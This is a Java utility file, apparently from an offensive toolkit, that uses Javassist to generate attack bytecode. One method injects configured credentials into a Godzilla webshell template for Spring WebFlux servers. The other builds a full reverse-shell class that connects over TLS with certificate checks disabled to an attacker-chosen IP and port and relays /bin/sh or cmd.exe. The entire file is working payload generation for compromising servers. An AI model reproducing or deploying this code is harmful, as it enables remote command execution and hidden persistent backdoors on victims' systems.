package util;

import javassist.*;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.lang.reflect.Modifier;

public class BytesCodeGenerator {
    public static byte[] generateWebfluxInjectGodzillaBytes(String className, String password, String secret,
                                                            String headerName, String headerValue,
                                                            String rand) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass godzillaClass = pool.makeClass(new ByteArrayInputStream(ResourceUtil.getResourceBytes("template/class/GodzillaAESBase64WebfluxFilterShell.class")));

        godzillaClass.setName(className);

        CtField passField = godzillaClass.getField("password");
        CtField secretField = godzillaClass.getField("secret");
        CtField headerNameField = godzillaClass.getField("headerName");
        CtField headerValueField = godzillaClass.getField("headerValue");
        CtField randField = godzillaClass.getField("rand");

        godzillaClass.removeField(passField);
        godzillaClass.removeField(secretField);
        godzillaClass.removeField(headerNameField);
        godzillaClass.removeField(headerValueField);
        godzillaClass.removeField(randField);

        randField = new CtField(pool.get("java.lang.String"),"rand",godzillaClass);
        randField.setModifiers(Modifier.PRIVATE|Modifier.STATIC);
        godzillaClass.addField(randField, CtField.Initializer.constant(rand));

        passField = new CtField(pool.get("java.lang.String"),"password",godzillaClass);
        passField.setModifiers(Modifier.PRIVATE|Modifier.STATIC);
        godzillaClass.addField(passField, CtField.Initializer.constant(password));

        secretField = new CtField(pool.get("java.lang.String"),"secret",godzillaClass);
        secretField.setModifiers(Modifier.PRIVATE|Modifier.STATIC);
        godzillaClass.addField(secretField, CtField.Initializer.constant(secret));

        headerNameField = new CtField(pool.get("java.lang.String"),"headerName",godzillaClass);
        headerNameField.setModifiers(Modifier.PRIVATE|Modifier.STATIC);
        godzillaClass.addField(headerNameField, CtField.Initializer.constant(headerName));

        headerValueField = new CtField(pool.get("java.lang.String"),"headerValue",godzillaClass);
        headerValueField.setModifiers(Modifier.PRIVATE|Modifier.STATIC);
        godzillaClass.addField(headerValueField, CtField.Initializer.constant(headerValue));

        godzillaClass.getClassFile().setMajorVersion(52);
        return godzillaClass.toBytecode();
    }

    public static byte[] generateReverseShellBytesCode(String ip,int port,String className){
        try {
            ClassPool pool = ClassPool.getDefault();
            pool.importPackage("javax.net.ssl.SSLContext");
            pool.importPackage("javax.net.ssl.SSLSocketFactory");
            pool.importPackage("javax.net.ssl.TrustManager");
            pool.importPackage("javax.net.ssl.X509TrustManager");
            pool.importPackage("java.io.File");
            pool.importPackage("java.io.InputStream");
            pool.importPackage("java.io.OutputStream");
            pool.importPackage("java.io.ByteArrayOutputStream");
            pool.importPackage("java.io.IOException");
            pool.importPackage("java.net.Socket");
            pool.importPackage("java.security.SecureRandom");
            pool.importPackage("java.security.cert.CertificateException");
            pool.importPackage("java.security.cert.X509Certificate");
            pool.importPackage("java.lang.reflect.Method");

            CtClass ctClass = pool.makeClass(className);
            ctClass.setSuperclass(pool.get("java.lang.Thread"));
            ctClass.setInterfaces(pool.get(new String[]{"javax.net.ssl.X509TrustManager"}));

            CtField ipField = new CtField(pool.get("java.lang.String"),"ip",ctClass);
            CtField portField = new CtField(CtClass.intType,"port",ctClass);
            ctClass.addField(ipField, CtField.Initializer.constant(ip));
            ctClass.addField(portField,CtField.Initializer.constant(port));
            ctClass.addField(new CtField(pool.get("java.io.InputStream"),"in",ctClass));
            ctClass.addField(new CtField(pool.get("java.io.OutputStream"),"out",ctClass));

            // 有参构造函数
            CtConstructor constructor = new CtConstructor(new CtClass[]{pool.get("java.io.InputStream"), pool.get("java.io.OutputStream")},ctClass);
            constructor.setBody("{\n" +
                    "        this.in = $1;\n" +
                    "        this.out = $2;\n" +
                    "    }");

            // 无参构造函数
            CtConstructor nonParamConstructor = new CtConstructor(new CtClass[]{}, ctClass);
            nonParamConstructor.setBody("{\n" +
                    "        try {\n" +
                    "            SecureRandom secureRandom = new SecureRandom();\n" +
                    "            SSLContext context = SSLContext.getInstance(\"TLS\");\n" +
                    "            context.init(null,new TrustManager[]{this},secureRandom);\n" +
                    "            SSLSocketFactory factory = context.getSocketFactory();\n" +
                    "            String shell = null;\n" +
                    "            if (File.separator.equals(\"/\")){\n" +
                    "                shell = \"/bin/sh\";\n" +
                    "            } else {\n" +
                    "                shell = \"cmd.exe\";\n" +
                    "            }\n" +
                    "            Process process = new ProcessBuilder(new String[]{shell})\n" +
                    "                    .redirectErrorStream(true)\n" +
                    "                    .start();\n" +
                    "            Socket socket = factory.createSocket(ip,port);\n" +
                    "            InputStream socketIn = socket.getInputStream();\n" +
                    "            OutputStream processOut = process.getOutputStream();\n" +
                    "            InputStream processIn = process.getInputStream();\n" +
                    "            OutputStream socketOut = socket.getOutputStream();\n" +
                    "            Class clazz = this.getClass();\n" +
                    "            Method start = Thread.class.getDeclaredMethod(\"start\",new Class[0]);\n" +
                    "            start.invoke(clazz.getConstructor(new Class[]{InputStream.class,OutputStream.class}).newInstance(new Object[]{socketIn,processOut}),new Object[0]);\n" +
                    "            start.invoke(clazz.getConstructor(new Class[]{InputStream.class,OutputStream.class}).newInstance(new Object[]{processIn,socketOut}),new Object[0]);\n" +
                    "        } catch (Exception e) {\n" +
                    "            throw new RuntimeException(e);\n" +
                    "        } \n" +
                    "    }");


            CtMethod run = new CtMethod(CtClass.voidType,"run",new CtClass[]{},ctClass);
            run.setModifiers(javassist.Modifier.PUBLIC);
            run.setBody("{\n" +
                    "        int len = 0;\n" +
                    "        byte[] buffer = new byte[1024];\n" +
                    "        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n" +
                    "        try {\n" +
                    "            while ((len=in.read(buffer))!=-1){\n" +
                    "                out.write(buffer,0,len);\n" +
                    "                out.flush();\n" +
                    "            }\n" +
                    "            out.close();\n" +
                    "            in.close();\n" +
                    "        } catch (IOException e) {\n" +
                    "            throw new RuntimeException(e);\n" +
                    "        }\n" +
                    "    }");

            CtMethod checkClientTrusted = new CtMethod(CtClass.voidType,"checkClientTrusted",new CtClass[]{
                    pool.get("java.security.cert.X509Certificate[]"),
                    pool.get("java.lang.String")},ctClass);
            checkClientTrusted.setModifiers(javassist.Modifier.PUBLIC);
            checkClientTrusted.setBody("{}");

            CtMethod checkServerTrusted = new CtMethod(CtClass.voidType,"checkServerTrusted",new CtClass[]{
                    pool.get("java.security.cert.X509Certificate[]"),
                    pool.get("java.lang.String")
            },ctClass);
            checkServerTrusted.setModifiers(javassist.Modifier.PUBLIC);
            checkServerTrusted.setBody("{}");


            CtMethod getAcceptedIssuers = new CtMethod(pool.get("java.security.cert.X509Certificate[]"),"getAcceptedIssuers",new CtClass[]{},ctClass);
            getAcceptedIssuers.setModifiers(javassist.Modifier.PUBLIC);
            getAcceptedIssuers.setBody("{\n" +
                    "        return new X509Certificate[0];\n" +
                    "    }");

            ctClass.addConstructor(constructor);
            ctClass.addConstructor(nonParamConstructor);
            ctClass.addMethod(run);
            ctClass.addMethod(checkClientTrusted);
            ctClass.addMethod(checkServerTrusted);
            ctClass.addMethod(getAcceptedIssuers);
            ctClass.getClassFile().setMajorVersion(52);
            return ctClass.toBytecode();
        } catch (CannotCompileException e) {
            throw new RuntimeException(e);
        } catch (NotFoundException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

}
